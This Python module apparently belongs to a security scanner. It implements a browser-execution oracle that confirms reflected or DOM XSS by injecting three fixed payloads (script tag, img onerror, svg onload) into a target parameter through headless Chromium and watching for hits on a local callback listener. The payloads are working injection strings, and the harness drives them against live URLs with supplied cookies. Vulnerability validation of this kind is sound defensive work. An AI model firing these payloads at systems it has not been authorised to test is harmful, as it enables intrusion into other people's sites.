"""Browser-execution oracle for reflected/DOM XSS.

Structural HTML analysis can tell where a canary lands; only a real browser can
tell whether it executed. This oracle replays a small fixed set of
callback-bearing payloads through Chromium and treats a hit on a run-specific
local endpoint as proof of execution. DOM position (via
``canary_execution_context``) is recorded as a secondary, corroborating signal
but never as the decisive one.

Determinism: the payload set is fixed and no LLM is involved, per the trust-plane
rule that only structured runtime evidence may drive a gate decision.
"""

from __future__ import annotations

import threading
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

from padv.validation.html_context import canary_execution_context


class BrowserUnavailableError(RuntimeError):
    """Playwright or a usable Chromium build is not available."""


# {cb} is replaced with the run-specific callback URL. Each variant exercises a
# different execution context so a single reflected sink shape is not assumed.
PAYLOAD_VARIANTS: dict[str, str] = {
    "script_tag": "<script>fetch('{cb}')</script>",
    "img_onerror": "<img src=x onerror=\"fetch('{cb}')\">",
    "svg_onload": "<svg onload=\"fetch('{cb}')\"></svg>",
}

_BENIGN_VALUE = "padv-benign-control-value"


@dataclass(slots=True)
class ProbeResult:
    executed: bool
    positive_flags: set[str] = field(default_factory=set)
    callback_token: str = ""
    callback_hits: set[str] = field(default_factory=set)
    firing_variant: str | None = None
    dom_execution_context: str | None = None
    negative_control_clean: bool = True
    detail: str = ""


class _CallbackHandler(BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002 - stdlib signature
        pass

    def _record(self) -> None:
        # Path shape: /cb/<token>/<variant>
        self.server.record_hit(self.path)  # type: ignore[attr-defined]
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self) -> None:  # noqa: N802
        self._record()

    def do_POST(self) -> None:  # noqa: N802
        self._record()


class _CallbackServer(ThreadingHTTPServer):
    daemon_threads = True

    def __init__(self, host: str) -> None:
        super().__init__((host, 0), _CallbackHandler)
        self._lock = threading.Lock()
        self._hits: list[str] = []

    def record_hit(self, path: str) -> None:
        with self._lock:
            self._hits.append(path)

    def hits(self) -> list[str]:
        with self._lock:
            return list(self._hits)


class BrowserExecutionOracle:
    """Replays callback-bearing XSS payloads in a real browser.

    Construct once per run (import check happens here), enter as a context
    manager to launch the browser and the callback listener, and call
    :meth:`probe` per candidate.
    """

    def __init__(self, *, callback_host: str = "127.0.0.1", headless: bool = True) -> None:
        try:
            from playwright.sync_api import sync_playwright  # noqa: F401
        except Exception as exc:  # pragma: no cover - import guard
            raise BrowserUnavailableError(f"playwright is not importable: {exc}") from exc
        self._callback_host = callback_host or "127.0.0.1"
        self._headless = headless
        self._playwright = None
        self._browser = None
        self._server: _CallbackServer | None = None
        self._server_thread: threading.Thread | None = None
        self._token_counter = 0

    # -- lifecycle -------------------------------------------------------

    def __enter__(self) -> BrowserExecutionOracle:
        from playwright.sync_api import sync_playwright

        # Bind the listener on all interfaces so the target (possibly a
        # container) can reach it, while payloads dial the configured host.
        self._server = _CallbackServer("0.0.0.0")
        self._server_thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._server_thread.start()

        try:
            self._playwright = sync_playwright().start()
            self._browser = self._playwright.chromium.launch(headless=self._headless)
        except Exception as exc:
            self._shutdown_server()
            if self._playwright is not None:
                try:
                    self._playwright.stop()
                except Exception:
                    pass
                self._playwright = None
            raise BrowserUnavailableError(f"could not launch chromium: {exc}") from exc
        return self

    def __exit__(self, *_exc: object) -> None:
        if self._browser is not None:
            try:
                self._browser.close()
            except Exception:
                pass
            self._browser = None
        if self._playwright is not None:
            try:
                self._playwright.stop()
            except Exception:
                pass
            self._playwright = None
        self._shutdown_server()

    def _shutdown_server(self) -> None:
        if self._server is not None:
            try:
                self._server.shutdown()
                self._server.server_close()
            except Exception:
                pass
            self._server = None

    @property
    def _callback_port(self) -> int:
        assert self._server is not None
        return self._server.server_address[1]

    # -- probing ---------------------------------------------------------

    def _next_token(self, candidate_uid: str) -> str:
        self._token_counter += 1
        safe = "".join(ch for ch in candidate_uid if ch.isalnum() or ch in "-_") or "cand"
        return f"padv-cb-{safe}-{self._token_counter:04d}"

    def _callback_url(self, token: str, variant: str) -> str:
        return f"http://{self._callback_host}:{self._callback_port}/cb/{token}/{variant}"

    def _build_url(self, base_url: str, request_spec: dict[str, Any], injection_param: str, value: str) -> str:
        path = str(request_spec.get("path", "") or "")
        raw_query = request_spec.get("query")
        query = dict(raw_query) if isinstance(raw_query, dict) else {}
        query[injection_param] = value
        joined = urllib.parse.urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
        encoded = urllib.parse.urlencode({str(k): str(v) for k, v in query.items()})
        return f"{joined}?{encoded}" if encoded else joined

    def _add_cookies(self, context: Any, base_url: str, cookie_jar: dict[str, str] | None) -> None:
        if not cookie_jar:
            return
        host = urllib.parse.urlsplit(base_url).hostname or "127.0.0.1"
        context.add_cookies(
            [
                {"name": str(name), "value": str(value), "domain": host, "path": "/"}
                for name, value in cookie_jar.items()
                if str(name).strip()
            ]
        )

    def _navigate(self, base_url: str, url: str, cookie_jar: dict[str, str] | None) -> str:
        assert self._browser is not None
        context = self._browser.new_context()
        try:
            self._add_cookies(context, base_url, cookie_jar)
            page = context.new_page()
            try:
                page.goto(url, wait_until="networkidle", timeout=15000)
            except Exception:
                # A navigation timeout still leaves whatever executed in place;
                # the callback listener is the source of truth, not the load.
                pass
            try:
                return page.content()
            except Exception:
                return ""
        finally:
            context.close()

    def probe(
        self,
        *,
        base_url: str,
        request_spec: dict[str, Any],
        injection_param: str,
        candidate_uid: str,
        cookie_jar: dict[str, str] | None = None,
    ) -> ProbeResult:
        if self._browser is None or self._server is None:
            raise BrowserUnavailableError("probe called outside the oracle context manager")

        token = self._next_token(candidate_uid)
        result = ProbeResult(executed=False, callback_token=token)
        callback_base = f"http://{self._callback_host}:{self._callback_port}"

        for variant, template in PAYLOAD_VARIANTS.items():
            payload = template.format(cb=self._callback_url(token, variant))
            url = self._build_url(base_url, request_spec, injection_param, payload)
            content = self._navigate(base_url, url, cookie_jar)

            hits = {h for h in self._server.hits() if token in h}
            if hits:
                result.executed = True
                result.callback_hits = hits
                result.firing_variant = variant
                result.positive_flags.add("xss_execution_witness")
                # Secondary corroboration: did the payload settle in an
                # executable DOM position after the browser parsed it?
                result.dom_execution_context = canary_execution_context(content, callback_base)
                if result.dom_execution_context is not None:
                    result.positive_flags.add("xss_dom_witness")
                break

        # Negative control: a benign value must not trigger the callback. Uses a
        # fresh token so it cannot inherit a positive hit.
        control_token = self._next_token(candidate_uid)
        control_url = self._build_url(base_url, request_spec, injection_param, _BENIGN_VALUE)
        self._navigate(base_url, control_url, cookie_jar)
        result.negative_control_clean = not any(control_token in h for h in self._server.hits())

        if not result.executed:
            result.detail = "no payload variant produced a run-specific callback"
        return result
